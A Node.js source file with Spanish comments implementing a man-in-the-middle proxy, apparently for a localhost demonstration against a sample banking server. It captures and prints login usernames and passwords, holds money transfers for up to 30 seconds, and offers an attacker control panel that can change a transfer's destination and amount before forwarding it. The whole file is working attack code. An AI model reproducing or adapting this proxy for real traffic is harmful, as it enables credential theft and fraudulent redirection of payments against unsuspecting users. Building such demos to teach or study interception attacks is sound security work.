// ============================================================
//  ATACANTE — PROXY MITM  —  http://localhost:8080
//  Intercepta credenciales Y transferencias.
//  Puede modificar monto/destino antes de reenviar.
//  Panel de control en http://localhost:8081
// ============================================================

const http = require('http');
const fs   = require('fs');
const path = require('path');

const PROXY_PORT  = 8080;
const ADMIN_PORT  = 8081;
const TARGET_HOST = 'localhost';
const TARGET_PORT = 3000;

// ─── Registros capturados ─────────────────────────────────────
const logCredenciales  = [];   // logins interceptados
const logTransferencias = [];  // transferencias interceptadas

// ─── Transferencias pendientes de aprobación ─────────────────
// id → { datos originales, resolve } — el proxy espera aquí
// hasta que el atacante decida qué hacer desde el panel
const pendientes = {};

const CORS = {
  'Access-Control-Allow-Origin':  '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

// ─── Función auxiliar: reenvía al servidor real ───────────────
function reenviar({ method, url, headers, body, token }, callback) {
  const opts = {
    hostname: TARGET_HOST,
    port:     TARGET_PORT,
    path:     url,
    method,
    headers:  { ...headers, host: `${TARGET_HOST}:${TARGET_PORT}` },
  };

  const req = http.request(opts, res => {
    let data = '';
    res.on('data', c => (data += c.toString()));
    res.on('end', () => callback(null, res.statusCode, res.headers, data));
  });
  req.on('error', err => callback(err));
  if (body) req.write(body);
  req.end();
}

// ─────────────────────────────────────────────────────────────
//  PROXY: intercepta todas las peticiones de la víctima
// ─────────────────────────────────────────────────────────────
const proxy = http.createServer((clientReq, clientRes) => {

  if (clientReq.method === 'OPTIONS') {
    clientRes.writeHead(200, CORS);
    clientRes.end();
    return;
  }

  let body = '';
  clientReq.on('data', chunk => (body += chunk.toString()));
  clientReq.on('end', () => {

    const url    = clientReq.url;
    const method = clientReq.method;

    // ── INTERCEPTAR LOGIN ─────────────────────────────────────
    if (method === 'POST' && url === '/login' && body) {
      try {
        const datos = JSON.parse(body);
        const registro = {
          id:        logCredenciales.length + 1,
          hora:      new Date().toLocaleTimeString('es-CO'),
          ip_victim: clientReq.socket.remoteAddress,
          datos,
        };
        logCredenciales.push(registro);
        console.log('\n🚨  [ATACANTE] ¡CREDENCIALES INTERCEPTADAS!');
        console.log(`    Usuario    : ${datos.usuario}`);
        console.log(`    Contraseña : ${datos.contrasena}  ← ROBADA`);
      } catch { /* no era JSON */ }
    }

    // ── INTERCEPTAR TRANSFERENCIA ─────────────────────────────
    if (method === 'POST' && url === '/transferir' && body) {
      try {
        const datosOriginales = JSON.parse(body);
        const id = 'P' + Date.now();

        console.log('\n💀  [ATACANTE] ¡TRANSFERENCIA INTERCEPTADA!');
        console.log(`    Destino    : ${datosOriginales.destino}`);
        console.log(`    Monto      : $${parseFloat(datosOriginales.monto).toLocaleString('es-CO')}`);
        console.log(`    → En espera de decisión del atacante...`);

        // Guardar registro para el panel
        const registro = {
          id,
          hora:        new Date().toLocaleTimeString('es-CO'),
          ip_victim:   clientReq.socket.remoteAddress,
          original:    { ...datosOriginales },
          modificado:  null,   // se llena si el atacante modifica
          estado:      'pendiente',  // pendiente | aprobado | modificado
        };
        logTransferencias.unshift(registro);

        // Guardar la petición pendiente con sus callbacks
        pendientes[id] = {
          headers: clientReq.headers,
          resolve: (datosFinales) => {
            const bodyFinal = JSON.stringify(datosFinales);
            const headersFinal = {
              ...clientReq.headers,
              'content-length': Buffer.byteLength(bodyFinal).toString(),
            };

            reenviar(
              { method, url, headers: headersFinal, body: bodyFinal },
              (err, status, resHeaders, resBody) => {
                if (err) {
                  clientRes.writeHead(502, CORS);
                  clientRes.end(JSON.stringify({ ok: false, mensaje: 'Servidor no disponible' }));
                  return;
                }
                const filteredHeaders = Object.fromEntries(
                  Object.entries(resHeaders).filter(([k]) => !k.startsWith('access-control-'))
                );
                clientRes.writeHead(status, { ...filteredHeaders, ...CORS });
                clientRes.end(resBody);
              }
            );
          },
        };

        // Timeout: si el atacante no decide en 30s, se aprueba automáticamente
        setTimeout(() => {
          if (pendientes[id]) {
            console.log(`\n⏱  [ATACANTE] Timeout — aprobando transferencia ${id} sin modificar`);
            registro.estado = 'aprobado';
            pendientes[id].resolve(datosOriginales);
            delete pendientes[id];
          }
        }, 30000);

        return; // no reenviar todavía — esperar decisión del atacante
      } catch { /* continúa con reenvío normal */ }
    }

    // ── REENVÍO NORMAL (todo lo demás) ────────────────────────
    reenviar(
      { method, url, headers: clientReq.headers, body },
      (err, status, resHeaders, resBody) => {
        if (err) {
          clientRes.writeHead(502, CORS);
          clientRes.end(JSON.stringify({ ok: false, mensaje: 'Servidor no disponible. ¿Está corriendo servidor-legitimo.js?' }));
          return;
        }
        const filteredHeaders = Object.fromEntries(
          Object.entries(resHeaders).filter(([k]) => !k.startsWith('access-control-'))
        );
        clientRes.writeHead(status, { ...filteredHeaders, ...CORS });
        clientRes.end(resBody);
      }
    );
  });
});

// ─────────────────────────────────────────────────────────────
//  PANEL DE CONTROL DEL ATACANTE
// ─────────────────────────────────────────────────────────────
const admin = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.writeHead(200); res.end(); return; }

  // ── API: credenciales capturadas ──────────────────────────
  if (req.url === '/registros') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(logCredenciales));
    return;
  }

  // ── API: transferencias interceptadas ─────────────────────
  if (req.url === '/transferencias') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(logTransferencias));
    return;
  }

  // ── API: aprobar transferencia sin cambios ─────────────────
  if (req.url.startsWith('/aprobar/') && req.method === 'POST') {
    const id = req.url.replace('/aprobar/', '');
    const p  = pendientes[id];
    const r  = logTransferencias.find(t => t.id === id);

    if (!p || !r) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, mensaje: 'No encontrado o ya procesado' }));
      return;
    }

    console.log(`\n✅  [ATACANTE] Aprobando transferencia ${id} sin modificar`);
    r.estado = 'aprobado';
    p.resolve(r.original);
    delete pendientes[id];

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  // ── API: modificar y reenviar transferencia ───────────────
  if (req.url.startsWith('/modificar/') && req.method === 'POST') {
    const id = req.url.replace('/modificar/', '');
    const p  = pendientes[id];
    const r  = logTransferencias.find(t => t.id === id);

    if (!p || !r) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: false, mensaje: 'No encontrado o ya procesado' }));
      return;
    }

    let body = '';
    req.on('data', c => (body += c.toString()));
    req.on('end', () => {
      try {
        const { destino, monto, descripcion } = JSON.parse(body);
        const datosModificados = {
          ...r.original,
          destino:     destino     || r.original.destino,
          monto:       monto       !== undefined ? monto : r.original.monto,
          descripcion: descripcion || r.original.descripcion,
        };

        console.log(`\n💀  [ATACANTE] ¡MODIFICANDO transferencia ${id}!`);
        console.log(`    Original  : $${r.original.monto} → ${r.original.destino}`);
        console.log(`    Modificado: $${datosModificados.monto} → ${datosModificados.destino}`);

        r.modificado = datosModificados;
        r.estado     = 'modificado';
        p.resolve(datosModificados);
        delete pendientes[id];

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: true }));
      } catch {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ ok: false, mensaje: 'Datos inválidos' }));
      }
    });
    return;
  }

  // ── API: limpiar registros ────────────────────────────────
  if (req.url === '/limpiar' && req.method === 'POST') {
    logCredenciales.length = 0;
    logTransferencias.length = 0;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return;
  }

  // ── Panel HTML ────────────────────────────────────────────
  const html = fs.readFileSync(path.join(__dirname, 'cliente', 'panel-atacante.html'));
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(html);
});

proxy.listen(PROXY_PORT, () => {
  console.log('─'.repeat(50));
  console.log(`🔴  PROXY MITM corriendo en http://localhost:${PROXY_PORT}`);
  console.log('─'.repeat(50));
});

admin.listen(ADMIN_PORT, () => {
  console.log(`👁   PANEL ATACANTE en http://localhost:${ADMIN_PORT}`);
  console.log('─'.repeat(50));
  console.log('   Abre ambas URLs para ver el ataque en tiempo real\n');
});
